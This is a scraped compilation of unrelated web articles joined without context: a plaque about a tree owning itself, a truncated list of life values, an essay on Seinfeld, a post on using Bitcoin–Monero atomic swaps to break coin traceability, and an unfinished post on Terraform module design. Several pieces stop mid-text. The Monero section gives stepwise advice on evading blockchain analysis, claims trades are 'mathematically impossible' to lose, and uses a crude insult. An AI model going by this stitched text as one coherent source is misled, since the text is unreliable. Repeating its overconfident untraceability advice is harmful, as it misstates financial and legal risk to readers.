<p>It’s now been more than 70 years since the tree moved in to the quiet residential neighborhood on Finley Street, and it appears to be doing well. Despite its unknown legal status, the legend lives on with a plaque commemorating the words that started it all. Slightly edited to be more intelligible to modern readers, it reads:</p>
<blockquote><p>For and in consideration of the great love I bear this tree and the and the great desire I have for its protection for all time, I convey entire possession of itself and all land within eight feed of the tree on all sides<br>
-William M Jackson</p></blockquote>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Last friday added another count to the yearly event we celebrate as “birthday”. I can barely remember my last birthday, I’m not a big birthday celebration person. I think every day can be a celebration if you choose it to be and a yearly event is not sufficient reason to treat yourself.<br></p><p>The passage of time seems to have changed over the years. Things move by at light speed, and if I blink I miss it. It doesn’t feel like a lot happened, and yet if I sit down and think about my last 1 year, a LOT has happened.</p><p>As I was reminiscing, I went beyond the last 1 year and thought generally of the value system that governs my life. These things come “obviously” to me and they’ve made my life better. I hope these values can serve you as well.</p><h3>1. Fixed vs Growth mindset</h3><p>If you’re anything like me from a few years ago, whenever someone would tell you a way to improve yourself or your life, your default reaction would be “yeah yeah but my life is hard I have X Y and Z reasons why I cannot do something about it”. </p><p>That’s fixed mindset. It’s when your mind operates under the base assumption that you, your situation, your surroundings, and your abilities, everything is static and fixed.</p><p>On the opposite end of the same spectrum is Growth mindset. Here, your mind knows and believes that everything is a work in progress, everything can be changed, and the path to changing something about your life that you don’t completely like is a path of fulfilment, not pain that you want to ignore.</p><p>A fixed mindset plateaus. A person with growth mindset improves and grows, a tiny bit, everyday and forever. </p><h3>2. Complaining drags you down, think problem-solutions instead</h3><p>I could complain about all the problems in my life, or I could list them down, write their probable cause, probable solutions, and the gaps in my knowledge that I need to fill with research to better understand the problem and find better solutions.</p><p>The energy that is used in complaining can be applied towards finding solutions. Not only do you not feel like shit, solving a problem is a positive experience and gives you the sense of control over your life vs submitting to “my life is so hard and the universe is out to get me”.</p><p>Sankalp was watching Mirzapur and shared this with me last night - </p><p><em>“I was watching Mirzapur today. There was a scene where the dons primary gun factory is burnt down to the ground by his rival. </em></p><p><em>He arrives at the scene, calmly guages the situation, then calls the CM who is one of his allies and tells him to release a press statement that the govt has tracked down a gun factory run by a criminal org, burnt it and put all the perpetrators in jail thereby making the state a safer place for everyone and uplift the party's image.”</em><br></p><h3>3. 0 or 1, choices are binary</h3><p>Most of the things in life are an either or. You either got up early today, or you didn’t. You either hit the gym, or you didn’t. </p><p>You could spend a lot of time in analysis of the gray area in between, but it’s a wasted effort on aspects of your life that operate like a transistor.It’s either 0 or 1, switched off or on.</p><p>Identify binary choices in your life and make them swiftly.<br></p><h3>4. Everything is on a spectrum</h3><p>At the same time, a lot of things in life are indeed in the gray area. These don’t have easy choices with clear outcomes, and yet you have to identify the spectrum and decide where you want to be on it in order to move ahead.</p><p>Hitting the gym is binary, how intensely you work out is on a spectrum.</p><p>Choosing to start a business is binary, how risky a path you pick lies on a spectrum.<br></p><h3>5. via negativa. Addition by subtraction</h3><p>The solution to most problems is not to add something, but to remove.</p><p>Not able to lose weight? You can exercise more, or you could eat less. You don’t need to add a night time meditation routine, you only need to remove your laptop and phone from the room.</p><p>A lot of pain in life can be prevented by “avoiding” doing things.<br></p><h3>6. Inversion, or how not to do</h3><p>Here’s a simple mental model that can make your life easier to navigate. Instead of looking for “how to be a good boss”, invert the question. </p><p>Identify instead the reasons that come up when you research “how to be a bad boss”. Apply via negativa, by avoiding the attributes of a bad boss you already become a good one. </p><p>I did the same when I had taken up my last PM job, by making a list of “how to be a bad product manager” and then avoiding those things. </p><p>Sankalp and I did the same when we were hiring by researching “mistakes to avoid when hiring”.<br></p><h3>7. Common sense is not common practice</h3><p>You might think something is obvious and also common sense, but I’ve learnt that there’s a reason many things are tagged as “common sense”. The phrase is an attribute that is desirable, but not necessarily literal. </p><p>Everyone knows eating greasy food in the long term will cause heart disease. Or not hitting the gym or exercising will make your body old and creaky and unfit. It’s common sense. But, not common practice.</p><p>The most important things in life are the simple and obvious ones. And yet they are the hardest to keep following day in and day out. <br></p><h3>8. Time and energy are finite resources</h3><p>The only finite resource in your life is time and energy. And every day, you have a finite amount available to you to apply to various things. Choose carefully.<br></p><h3>9. Velocity, not speed</h3><p>I refer to this over the more commonly referred hard work vs smart work analogy.</p><p>You could be running at a 100 miles/hour but getting no where if you’re moving in circles. Speed. </p><p>Your direction, where you are headed, is more important. Only by moving in the right direction do you make real progress. Velocity.<br></p><h3>10. Treat others the way you would want to be treated</h3><p>Another of the common sense not common practice terms. It’s easy to complain about others when they treat you unfairly. Yet when the power dynamics are reversed, people often do the same treatment to others.</p><p>The real test is how you treat others when you are in a position of power.<br></p><h3>11. People don’t know what they really want</h3><p>Nobody really does. The pursuit of meaning can end with the sharp knife of nihilism. There is no meaning or purpose in life.</p><p>But while having these thoughts are crucial to self-discovery, they aren’t helpful to fixate upon.</p><p>So people create meaning, direction, structures around their life to add meaning and purpose.</p><p>Which is why I think nobody really knows what they want. It’s all made up anyway.<br></p><h3>12. Your health can’t wait</h3><p>The truth is, every day our bodies are getting slightly older.</p><p>And after 25 things start moving faster. I bet they move even faster after 30 or later. Save yourself the trouble and maintain your body from before.</p><p>It makes it that much easier to get out of bed every day, have the energy to do all the things you want during the day, and just generally feel good.<br></p><h3>13. What you eat is what your body becomes</h3><p>The food you eat literally becomes molecules in your body.</p><p>One of the simplest ways to maintain health is by focusing on your eating.</p><p>It’s fascinating to me that we eat 3-6 times/day, and yet very few people spend any time or mental bandwidth understanding food, nutrition and its role in how it shapes our body.</p><p>There are simple heuristics that can go a long way - eating fats doesn’t make you fat, sugar is a carb that affects your body similar to how alcohol does, fasting has marvellous effects on your body, the mantra for weight loss is calories in calories out, the mantra for muscle gain is reps and protein intake.<br></p><h3>14. The information you consume is what your mind becomes</h3><p>If the food you eat becomes your body, then the information you consume becomes your mind. Protect your mind as if it’s your most precious resource (it is), by filtering the sources of information that you let influence you. Even your Twitter feed is programming your subconscious without you realising it.<br></p><h3>15. How you think governs everything in your life</h3><p>If you really think about it, how you think governs your whole life.</p><p>What you eat, whether you exercise, who you date, how you treat relationships, how you learn something new, how you deal with adversity, how you treat others when you are in a position of power, how you spend your free time, how you build your business.</p><p>Everything steps from the root of your thought process, how you think.</p><p>I spent an insane amount of time in 2017-18 deliberately trying to understand my thought patterns, why I think and do the way I do, how do I actually want to be, what should I change and what should I double down upon.</p><p>You can try to do this by reading books, but the best answers will come through developing high self-awareness and doing deep self-introspection.<br></p><h3>16. Generalist skillset is a Swiss knife</h3><p>Over the past few years, I’ve followed a simple mantra to learn whatever hard or soft skills can improve my skill tree required to build successful businesses.</p><p>I visualise it like the skill tree in an RPG game. You can’t unlock and master all branches, so you have to be selective in nurturing the right set of skills.</p><p>Thanks to this mindset, I learnt how to think about product, learnt how to design, simple coding but more importantly understanding the fundamentals of tech, and now I’m learning to become a great marketer.</p><p>This Swiss Army knife is what helps me understand and imagine better ways to achieve the goals we have set to build DelightChat.</p><p>And this doesn’t just apply to entrepreneurs.</p><p>If you’re a designer, you need to understand product management and technology to understand how design fits in between.</p><p>If you’re a marketer, you need to know how to write copy or design creatives or build landing pages in addition to coming up with a marketing strategy.<br></p><h3>17. The real meta-skill is the ability to learn</h3><p>And during this journey I realised that the actual ability isn’t being able to design, or manage product, or write great copy. The real meta-skill is the ability to learn new skills as they become important in your journey. <br></p><h3>18. Don’t chase people, become valuable instead</h3><p>Whenever a friend asks me “How do I make her like me?” or similar question, my answer …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>A couple of weeks ago, me and my team made a pact that each of us will write something every weekend. What we write about depends on what influenced the individual during that week that was worth sharing with the world.<br></p><p>As it turns out, my job is to write software and most of my time during the week is spent on solving technical challenges. Sometimes I can write about these challenges and how I solved them, but sometimes I can’t because we are too early in our journey of building <a href="https://www.delightchat.io/" target="_blank">delightchat.io</a> to be able to make our core architecture decisions public. <br></p><p>So what do I write this week that will help folks reading it learn something? Here is a radical thought - what if I write about something that doesn’t have any lesson at all? Does good content always need a theme and an underlying concept that helps somebody do something better?<br></p><h3><strong>Seinfeld - a show about nothing</strong><br></h3><p>For those who are not familiar, Seinfeld was a very popular sitcom that aired from the early 90s to the late 90s and it is generally referred to as “a show about nothing”. <br></p><p>This is only a half truth because Seinfeld is actually a very well written show with intricate plots that seem random at first but tie up pretty smoothly towards the end of an episode. The real reason it is a show about nothing is because unlike other sitcoms, the episodes do not have a theme. &nbsp;There is no lesson that the characters learn and evolve as human beings, there is no hidden metaphor that teaches you morals and values of how to navigate life.<br></p><p>The show instead focuses on whimsical scenarios that the characters face as a result of being selfish and inconsiderate. The episodes involve characters getting into conflicts during their day to day interactions with friends and family and how they handle the conflict while learning absolutely nothing in the process.<br></p><h3><strong>Why I think this is important</strong><br></h3><p>Despite everything you just read about Seinfeld, this was one of the most if not the most wildly successful sitcoms of all time and every sitcom since Seinfeld tries to embody some aspect of this in their plots. If not in the main plot there are sub plots which are about people screwing up and learning nothing. And this is for the simple reason that the show was very entertaining.<br></p><p>Sometimes all we really need in life is a creative way to pass the time. We are not in a race to constantly better ourselves, become the post possible version of ourselves, learn new things and kill it in life every single day. Some days are just slow and unproductive. And these days matter because otherwise how do we value the days where we do kill it in life?<br></p><p>We are fed this notion that everyone needs to chase a goal in life and every single day must be an attempt to get one step closer to that goal. For the record, I do think we should all have something that drives us and fuels the machine that keeps us going in life, but this doesn’t mean that the machine can’t rest and do nothing once in a while. <br></p><h3><strong>Life is long</strong><br></h3><p>The phrase “life is short” is quite popular. It is meant teach folks that every day must be lived to the fullest because we are all going to die someday and the last thing we want is to miss out on anything worthwhile.<br></p><p>But if you think about it, unless everyone has a terminal disease or gets into an accident, the average life expectancy of a person is over 70 years. This seems like a long time to be able to live life to the fullest every single day! <br></p><p>Life is long enough to waste a few days on doing nothing and let the brain and the body cool off and blow some steam. Life is long enough to let a few days pass without learning something new or accomplishing something. Life is long enough to waste time reading this article even though it doesn’t teach you anything.<br></p><h3><strong>Why did I write this article?</strong><br></h3><p>If you are still reading this despite me telling you that you will learn nothing from this, it means that you were most likely just browsing the internet while looking for nothing in particular. And that’s why I wrote this article - to help you pass the time and remind you that it is completely okay to do so.<br></p><p>If by any chance you are reading this while sipping your morning coffee or having a meal, or in general while performing a pretty uneventful task, I hope I kept you engaged. This is what Seinfeld did for me.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <div><p>Monero cryptographers <a href="https://eprint.iacr.org/2020/1126.pdf" target="_blank" rel="noopener noreferrer">recently discovered</a> how to conduct “atomic swaps” between Bitcoin and Monero. This means that any two people can swap Bitcoin for Monero between them without relying on any third-party service, using only software they run themselves.</p><p>As Monero is the god of privacy coins (and the blockchain <a href="https://icryptonode.com/products/monero-icryptonode-raspberry-pi-device" target="_blank" rel="noopener noreferrer">we develop products for</a>), this naturally led to speculation that this innovation would enable Monero to become a layer-2 privacy solution for bitcoin, which is itself <a href="https://www.chainalysis.com/" target="_blank" rel="noopener noreferrer">notoriously traceable</a>.</p><p>Over the past week I have read all manner of incorrect information from uninformed commenters about if this is possible, how it will work, and what this means for Monero and Bitcoin.</p><p>Let me state clearly -</p></div>

<div><p>But it’s a Yes* (with an asterisk!). Let me explain:</p><p>Bitcoin is a public blockchain - the ledger is entirely open for analysis. This creates a perfect trail of transactions, allowing anyone to see the path of bitcoin from “freshly mined” to person A to B to C and so on. Bitcoin users who wish to maintain privacy have to do additional steps, such as using a mixing-wallet like <a href="https://www.wasabiwallet.io/" target="_blank" rel="noopener noreferrer">Wasabi</a>. Using Wasabi is an imperfect solution, has fees, and requires a relatively large amount of money to use. Another option is to trust a third-party like a centralized exchange. Either way, “breaking the chain” of bitcoin transactions to establish privacy is difficult, expensive, usually involves trusted third-parties, and is not guaranteed to maintain privacy forever as Chainalysis and similar firms become more sophisticated at tracing bitcoin transactions.</p><p>Bitcoin / Monero atomic swaps will establish privacy in a fully decentralized way - one that doesn’t rely on mixing technology or third-party trusted services. The way it will work is thus:</p><p>Alice currently owns bitcoin, but because of blockchain-analysis it’s trivial to know she purchased it at Coinbase. Fearing for her safety from an abusive ex-boyfriend, Chad, who works for the government and has access to Chainalysis software, it’s absolutely essential that Alice hides her bitcoin. Once Alice’s bitcoin is unlinked from her ownership, no one can prove she owns it, thus maintaining her personal safety.</p><p>Alice must do two trades - first, she swaps her bitcoin for an equivalent amount of Monero using an atomic swap and a counterparty she found in a decentralized exchange. She trades 1 BTC for 10 XMR.</p><p>Next, Alice swaps her XMR back to BTC. The market moved against her slightly - she now trades 10 XMR for 0.99 BTC, plus a small amount for network fees. Alice ends up with 0.9895 BTC.</p><p>Now, Alice has bitcoin that cannot be traced to her identity - she “broke the chain” that linked the purchase to her own identity. Alice never had to speak to anyone or trust any third-party service for doing so. She did work with two counterparties (trades from BTC to XMR and then XMR to BTC), but had no knowledge of who they were and never spoke with them, relying on software to conduct the swap peer-to-peer. She could not be scammed - provided she agreed with the trade amounts, it was mathematically impossible for her to lose her money at any step of the way - that’s why this is “trustless”.</p><p>Now, Alice has bitcoin she can save or spend anonymously. If she ever has a reason to anonymize more bitcoin, she can use the same steps to convert unsafe bitcoin to safe bitcoin, using the Monero blockchain as a privacy layer. Her wealth is now safe from Chad, the government rapist.</p></div>
<h2>Risks of Bitcoin to Monero Atomic Swaps</h2>
<div><p>As mentioned previously, <strong>Alice cannot be scammed using atomic swaps</strong>. Mathematics will perfectly protect her from a counterparty that tries to steal her money.</p><p>The biggest risk to Alice comes from <em>time</em> - the longer she waits, the less likely blockchain analysis will be able to track her, but the more likely the price will move against her.</p><p>Why is waiting important? Just like with <a href="https://tornado.cash/" target="_blank" rel="noopener noreferrer">tornado.cash</a>, if Alice were to quickly swap into XMR and back out into BTC, there will likely be few or no swaps other than her’s. This would make it probabilistically quite likely that the second BTC output is Alice’s. Alice should wait for several other swaps to occur before she executes her swap back into BTC.</p><p>Another risk is in the size of outputs. If Alice swaps 9.347 BTC into XMR, then swaps 9.347 back out, it’s highly likely it’s her’s.</p><p>Therefore, Alice should 1) Wait a while holding XMR (hours or days), and 2) make several, staggered transactions back into BTC from XMR. The biggest danger here is the price of Monero moving against Bitcoin, but it will likely be worth it to maintain privacy.</p><p>I anticipate that services will be created that make anonymizing Bitcoin simple and safe using standard output amounts (0.1, 1.0, 10.0 BTC, etc.) similar to tornado.cash.</p><p>One final note - I assume that chain-analysis can determine which bitcoin outputs are used for Monero atomic swaps. Given that the Bitcoin script used for the 2-of-2 Bitcoin locks is extremely specific, I assume that all Bitcoin UTXOs used for Monero swaps will be tracked. If Monero researchers find a way to obfuscate all atomic swap transactions among normal transactions, privacy can be greatly increased. But given the amount of intense research this solution will inevitably attract, it is unlikely “hiding among the crowd” will be possible. This is also why waiting after a swap will be extremely important.</p></div>
<h2>Conclusion</h2>
<p>Monero can indeed be used as a layer-2 privacy solution for Bitcoin. It is not perfect, and risks with timing and transaction size can compromise privacy. But Monero is currently the only trustless, fully-decentralized solution for enhancing privacy on Bitcoin and I anticipate that it will become extremely popular.

<![CDATA[Practices for Better Terraform Module]]>

October 24, 2020 | https://deeeet.com/posts/practices-for-better-terraform-module/ | <a href="https://web.archive.org/web/*/https://deeeet.com/posts/practices-for-better-terraform-module/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
      <p>I’ve been working at the internal platform team at Mercari for 3 years. In that team, we’ve developed and provided the special Terraform module, which bootstraps required infrastructure and SaaS services for building one microservice, to internal developers (See more details on <a href="https://speakerdeck.com/b4b4r07/terraform-ops-for-microservices">Terraform Ops for Microservices</a>). Now, this module is used by more than 400 services (since we create both development and production environments, actually it’s 800) and we’ve released the module more than 30 versions.</p>
<p>This blog post introduces some of the practices we developed while working on that Terraform module. “Better”, in this context means, <em>from the module user’s point of view</em>, easier to use and easier to maintain for a long period of time. Since the practices are very high level, some of them can be applied not only for the internal Terraform module but also for the public one and other software development like <a href="https://kubernetes.io/docs/concepts/extend-kubernetes/api-extension/custom-resources/">Kubernetes CRD</a> and so on…</p>

<p>When designing the Terraform module, the first and most important thing you need to aware of is the variable of the Terraform module is API. Once you define a variable in your module definition, it’s open to users and target to modification. This means it becomes an interface between users and your module. In this sense, you can think of it as API.</p>
<p>Since it’s API, what kind of variables you define decides the complexity and the usability of your module. But, fortunately, many practices have been developed for good API design in this industry. The followings are some of the practices from them and I think it’s important for Terraform module design.</p>
<h2 id="module-should-be-deep">Module should be deep</h2>
<p>The Terraform module is an abstraction of the collection of the raw Terraform resources. An abstraction, in general, is a simplified view of any entity, which omits unimportant details. We create a module to make it easier for your users to think about and manipulate complex resources.</p>
<p><img src="https://user-images.githubusercontent.com/1256183/96132088-eafb8400-0f34-11eb-90d1-3eebabfadf38.png" alt="Philosophy"></p>
<p>The best modules are those that provide powerful functionality yet have a simple interface. In the book, <a href="https://www.amazon.com/dp/B07N1XLQ7D">A Philosophy of Software Design</a> calls this “Deep module” (The word “module” is used for different context and not about Terraform module but you can think of them same). You can see the visualized notion of this above. “Deep” means they have lots of functionality hidden behind a simple interface. On the other hand, “Shallow module” is one whose interface is relatively complex in comparison to the functionality that provides (does not hide much complexity).</p>
<p>The module’s interface represents the complexity of that module imposes to the user: the smaller and simpler the interface, the less complexity that it introduces. When designing your Terraform module, always think about the depth of it.</p>
<p>Be careful that once you open your interface and it’s used by users, you can not change or delete it easily.  And it may be used in an unexpected way (See <a href="https://www.hyrumslaw.com/">Hyrum’s Law</a>). So what variable to expose is really important.</p>
<p>You can more learn about interface design from e.g., <a href="https://increment.com/apis/consider-the-interface-api-redesign/">Consider the interface</a>.</p>
<h2 id="interface-should-be-intuitive">Interface should be intuitive</h2>
<p>The module interface = <code>variable</code> should be intuitive to use. What happens when changing the variable should be obvious and predictable to your users. Don’t surprise your users. For example, avoid using the <code>enable_x</code> variable for enabling features not related to x.</p>
<p>Using consistent naming and format in the same module is also important to make it intuitive. For example, if the module uses the <code>enable_x</code> variable for enabling feature “x”, then enabling “y” should be also done by the <code>enable_y</code> variable, not by <code>setup_y</code> or <code>use_y</code>.</p>
<h2 id="variable-should-have-smart-default">Variable should have smart default</h2>
<p>The module variable should have a smart default value which covers 80% of users. The smart value means the best value in a limited context. The module which can be used without any configuration is the best (It also related to the upgrading strategy below). You should design carefully what default value it should have.</p>
<p>But, at the same time, it should have configuration knobs for the power users. Normally, you have the power users who can not use the module like the 80% of normal users. For such users, you should prepare ways of changing the behavior of the module. This knob should be designed properly and avoid having a shallow interface.</p>

<p>Upgrading is one of the most critical tasks of long-developing software. But, at the same time, it’s also the most bothering task. This is also true for the Terraform module, especially which is for the general purpose and widely used… It’s been huge problem for our Terraform module, too.</p>
<p>Since normally new features are added to the latest version, if you want your users to use the feature, you need to ask them to upgrade it. To make it works, upgrading must be easy as possible and less cost to users.</p>
<p>To make upgrading easy, <em>keeping backward compatibility</em> is most important. In the case of the Terraform module, if there is no Terraform state diff when upgrading the module version, it keeps backward compatibility. If there is no state diff, users do not need to care about anything when upgrading. So the best upgrading is no Terraform state diff.</p>
<p>The following practices are the idea of achieving this and reducing the cost of upgrading.</p>
<h2 id="new-functionality-should-be-off-by-default">New functionality should be off by default</h2>
<p>If you want to introduce new functionality to your module, you should make the feature “off” by default. It should be explicitly “on” by the users who want to use it.</p>
<p>Sometimes, you want to enforce all your users to use some features by default. Even in that case, you should do it gradually. When introducing, it should be “off” by default. Then you should ask users to enable it explicitly. After the feature adaption rate is increased (you should monitor it), then you can make it “on” by default. With this, you can reduce the effect of upgrading.</p>
<h2 id="upgrading-should-be-automated">Upgrading should be automated</h2>
<p>In other words, prepare <a href="https://dependabot.com/">dependabot</a> for your module. Especially, if you update the module frequently, you must prepare it. Even if you ask your users to upgrade, normally they don’t work on because normally they have more important tasks to do. We struggled with this a lot. So, instead, create PRs for them.</p>
<p>Internally, not only we send PRs of new version upgrading, but also we have the mechanism to automatically merge the PR if there is no Terraform diff. With the combination of this and <em>keeping backward compatibility</em> practice, we can increase the rate of users who use the latest version of the module.</p>
<h2 id="state-diff-should-be-small-as-possible">State diff should be small as possible</h2>
<p>It’s not possible to make upgrading no state diff always. Sometimes you need to introduce breaking changes e.g., because of changes in dependent resources or security issues needed to be patched as soon as possible.  In that case, you must think about how to reduce the cost. If the state diff is less, then the cost of upgrading is less. The more you include diff, the fewer chances users upgrade it.</p>
<p>When introducing the breaking changes, you must tell it by the documentation. The documentation can be <a href="https://keepachangelog.com/en/1.0.0/">CHANGELOG</a> or your user guides. If the documentation clearly describes the changes or the actions users need to take, the cost of upgrading decreases. For example, if the documentation shows what kind of state diff is expected in the documentation, the users can upgrade it without fear.</p>
